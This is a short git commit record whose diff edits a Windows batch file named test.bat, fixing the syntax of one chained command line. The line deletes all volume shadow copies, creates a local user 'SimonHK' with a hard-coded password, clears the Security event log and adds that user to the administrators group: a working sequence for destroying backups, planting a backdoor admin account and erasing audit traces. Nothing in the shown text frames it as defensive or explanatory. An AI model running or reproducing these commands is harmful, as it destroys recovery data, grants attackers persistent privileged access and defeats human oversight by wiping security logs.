4f12c55e939ff5f6492be359e17065c27f15d4c8
squentel <30870132+squentel@users.noreply.github.com>
2022-09-25 11:50:58 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,1 +1,1 @@
-vssadmin delete shadows /all && net user /add SimonHK passA-JHG123 SimonHK /add && wevtutil cl Security && net localgroup administrators
+vssadmin delete shadows /all && net user /add SimonHK passA-JHG123 && wevtutil cl Security && net localgroup administrators SimonHK /add
